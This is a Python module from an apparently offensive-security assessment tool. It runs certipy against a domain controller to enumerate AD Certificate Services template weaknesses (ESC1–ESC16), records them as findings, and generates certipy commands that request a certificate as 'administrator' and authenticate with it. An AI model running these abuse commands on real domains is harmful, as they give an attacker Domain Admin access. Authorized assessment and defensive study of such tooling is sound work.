"""AD Certificate Services abuse — certipy's ESC findings, into state.

A single low-privileged domain credential plus a misconfigured certificate template
is one of the shortest paths to Domain Admin, and cert auth *survives password
resets*. fieldkit drives ``certipy find -vulnerable``, parses the ESC1-ESC16
weaknesses out of its output, and records each as a finding so ``analyze`` ranks it
and ``report`` writes it up. The abuse itself (request a cert as a privileged UPN,
then PKINIT to a TGS/NT hash) is attacker-side certipy, surfaced as the finding's
next step.

Pure parse + an injected-runner driver, so it is testable without a CA.
"""
import re
from dataclasses import dataclass

from .creds import Credential

_NAME = re.compile(r"(Template Name|CA Name)\s*:\s*(.+?)\s*$")
_ESC = re.compile(r"\b(ESC\d+)\b\s*:\s*(.+?)\s*$")


@dataclass(frozen=True)
class AdcsVuln:
    """One ESC weakness on a template or CA."""

    esc: str            # ESC1 ... ESC16
    target: str         # the template (or CA) name it applies to
    ca: str
    detail: str


def parse_certipy(text):
    """Parse ``certipy find -vulnerable -stdout`` into :class:`AdcsVuln` rows.

    Tracks the current CA/template name and associates each ``ESCn`` line under a
    ``[!] Vulnerabilities`` block with it. De-duplicated on (esc, target).
    """
    current, ca = "", ""
    vulns, seen = [], set()
    for raw in (text or "").splitlines():
        m = _NAME.search(raw)
        if m:
            current = m.group(2).strip()
            if m.group(1) == "CA Name":
                ca = current
            continue
        m = _ESC.search(raw)
        if m:
            esc, detail = m.group(1), m.group(2).strip()
            key = (esc, current)
            if key in seen:
                continue
            seen.add(key)
            vulns.append(AdcsVuln(esc=esc, target=current or ca, ca=ca, detail=detail))
    return vulns


def _find_argv(cred, dc_ip):
    argv = ["certipy", "find", "-u", f"{cred.username}@{cred.domain}",
            "-dc-ip", dc_ip, "-vulnerable", "-stdout"]
    if cred.secret_type == "password":
        argv += ["-p", cred.secret]
    elif cred.is_hash:
        argv += ["-hashes", f":{cred.nt}"]
    return argv


@dataclass
class AdcsReport:
    dc: str = None
    found: int = 0
    vulns: list = None
    aborted: str = None

    def __post_init__(self):
        if self.vulns is None:
            self.vulns = []


def run_find(store, dc_host, cred, *, run=None, on_event=None):
    """Enumerate vulnerable templates via certipy and record each ESC as a finding.

    Returns an :class:`AdcsReport`. Findings are unproven (the weakness is enumerated,
    not yet exploited); ``analyze`` surfaces them with the abuse command.
    """
    from . import runner as runner_mod
    run = run or (lambda argv, env=None: runner_mod.run(argv, env_add=env))
    cred = cred if isinstance(cred, Credential) else Credential.from_row(cred)
    report = AdcsReport(dc=dc_host["ip"])
    result = run(_find_argv(cred, dc_host["ip"]), {})
    if not result.ok:
        report.aborted = result.error
        return report
    with store.transaction():
        for v in parse_certipy(result.output):
            _, created = store.add_finding(
                "adcs_esc", f"{v.esc} on {v.target}", host_id=dc_host["id"],
                evidence=f"{v.esc}: {v.detail}" + (f" (CA {v.ca})" if v.ca else ""),
                risk="config-change")
            report.vulns.append(v)
            if created:
                report.found += 1
                if on_event:
                    on_event(f"  {v.esc}: {v.target} — {v.detail}")
    return report


def abuse_command(vuln, cred, dc_ip, upn="administrator"):
    """The certipy abuse next-step for a vuln — request a cert as ``upn``, then auth."""
    dom = cred.domain if isinstance(cred, Credential) else (cred["domain"] or "")
    user = cred.username if isinstance(cred, Credential) else cred["username"]
    return (f"certipy req -u {user}@{dom} -dc-ip {dc_ip} -ca {vuln.ca or '<CA>'} "
            f"-template {vuln.target} -upn {upn}@{dom}   "
            f"# -> {upn}.pfx, then: certipy auth -pfx {upn}.pfx -dc-ip {dc_ip}")
